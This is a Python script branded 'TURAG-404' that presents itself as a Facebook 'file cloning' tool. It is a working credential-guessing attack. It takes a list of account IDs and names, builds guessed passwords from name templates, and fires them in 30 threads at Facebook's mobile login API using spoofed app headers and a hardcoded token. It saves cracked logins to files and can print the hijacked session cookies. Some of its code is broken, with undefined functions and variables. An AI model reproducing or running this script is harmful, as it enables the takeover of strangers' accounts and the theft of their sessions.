 ####@-----Import-----@####
import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed
os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass
try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass
accounts = []
loop = 0
####DESIGN####
t='TURAG'
def oo(t):
	return '\033[1;92m[\033[1;97m'+str(t)+'\033[1;92m]\033[1;97m '
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' xx-code=TURAG-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','xx-182^)Code=TURAG-2233]'))
###USERAGENTSGEN####
fbks=("Dalvik/2.1.0 (Linux; U; Android 12; Blade A72s Build/SP1A.210812.016)")
import requests
rs = requests.get
##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\033[1;31m"
green="\033[1;32m"
yelloww="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;41m"
pvt = "\033[1;0m"
sys.stdout.write('\x1b]2; TURAG-404\x07')
def logo():
    os.system('clear')
    print(f"""\033[1;32m
888888 88   88 88""Yb    db     dP""b8
  88   88   88 88__dP   dPYb   dP   `"
  88   Y8   8P 88"Yb   dP__Yb  Yb  "88  
  88   `YbodP' 88  Yb dP''''Yb  YboodP
\033[38;5;99m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{green}[{white}={green}] {yellow}Owner    {green}: Turag Ahamed
{green}[{white}={green}] {yellow}Tools    {green}: File Cloning
{green}[{white}={green}] {yellow}Version  {green}: 0.1
\033[38;5;99m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
        print(f'\033[38;5;99m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def main():
    os.system('clear')
    logo()
    print(f"{green}[{white}1{green}] {yellow}File Cloning")
    print(f"{green}[{white}2{green}] {yellow}Working Pass")
    print(f"{green}[{white}0{green}] {rad}Exit")
    linex()
    selector = input(f'{green}[{white}={green}] {white}Select : {green}')
    if selector in ['01','1']:
        file()
    if selector in ['02','2']:
        pas()
    if selector in ['00','0']:
        exit()
    else:
        print(f'Decided Wrong!');time.sleep(1);mainn()
def pas():
    os.system("clear")
    logo()
    print(f'{green}[{white}={green}] {yellow}first123\n{green}[{white}={green}] {yellow}first1234\n{white}[{green}3{white}] {green}first12345\n{white}[{green}4{white}] {green}last123\n{white}[{green}5{white}] {green}last1234\n{white}[{green}6{white}] {green}last12345\n{white}[{green}7{white}] {green}firstlast123\n{white}[{green}8{white}] {green}firstlast1234\n{white}[{green}9{white}] {green}firstlast12345\n{white}[{green}10{white}] {green}first@123\n{white}[{green}11{white}] {green}first@\n{white}[{green}12{white}] {green}first@@\n{white}[{green}13{white}] {green}first@@@\n{white}[{green}14{white}] {green}@first@\n{white}[{green}15{white}] {green}77889900\n{white}[{green}16{white}] {green}১২৩৪৫৬\n{white}[{green}17{white}] {green}১২৩৪৫৬৭\n{white}[{green}18{white}] {green}১২৩৪৫৬৭৮\n{white}[{green}19{white}] {green}009988\n{white}[{green}20{white}] {green}708090\n{white}[{green}21{white}] {green}@@@###\n{white}[{green}22{white}] {green}@#@#@#')
    time.sleep(1000)
l = []
####@-----File-----@####
def file():
    os.system("clear")
    logo()
    if 'gm' in l:
        file = '.TURAG'
    else:
        file = input(f"{green}[{white}={green}] {yellow}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f'Decided Wrong!');time.sleep(1)
        main()
    method()
    exit()
####@-----FileM-----@####
def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    logo()
    if 'o':      
        lp = input(f'{green}[{white}={green}] {yellow}Password Limit : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{green}[{white}={green}] {yellow}{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mPut Password-{x+1}: '))
            pass
        else:
            print(f"{green}[{white}={green}] {yellow} Numeric Only")
            exit()
    print(f'\n{green}[{white}1{green}] {yellow} Method 1 (NEW)\n{green}[{white}2{green}] {yellow} Method 2 (FAST)')
    m=input(f"{green}[{white}={green}] {yellow} Input : ") 
    print(f'\n{green}[{white}?{green}] {yellow} Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{green}[{white}={green}] {yellow} Input : ")
    print(f'\n{green}[{white}?{green}] {yellow} Do You Want To Show Cookies?(y/n)')
    c=input(f"{green}[{white}={green}] {yellow} Input : ")
    apps='y'
    os.system("clear")
    logo() 
    print(f'{green}[{white}={green}] {yellow}Total Account : '+str(len(accounts)))
    print(f'{green}[{white}={green}] {yellow}Use Apn For Better Results.')
    linex()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;92m[\033[1;97mTURAG-M1\033[1;97m]\033[1;92m {}-{} \033[1;97m[\033[1;92m{}\033[1;97m] \033[1;92mOK : \033[1;97m{} \033[1;91mCP : \033[1;97m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = fbks
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mTURAG-OK\033[1;92m] \033[1;97m'+acc+' \033[1;93m~\033[1;97m '+pword+'  ')
                open('/sdcard/TURAG-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                           print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mTURAG-CP\033[1;91m] \033[1;97m'+acc+' \033[1;93m~\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/TURAG-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10) 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;92m[\033[1;97mTURAG-M2\033[1;97m]\033[1;92m {}-{} \033[1;97m[\033[1;92m{}\033[1;97m] \033[1;92mOK : \033[1;97m{} \033[1;91mCP : \033[1;97m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = fbks
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mTURAG-OK\033[1;92m] \033[1;97m'+acc+' \033[1;93m~\033[1;97m '+pword+'  ')
                open('/sdcard/TURAG-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(session,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                  print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mTURAG-CP\033[1;91m] \033[1;97m'+acc+' \033[1;93m~\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/TURAG-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  

main()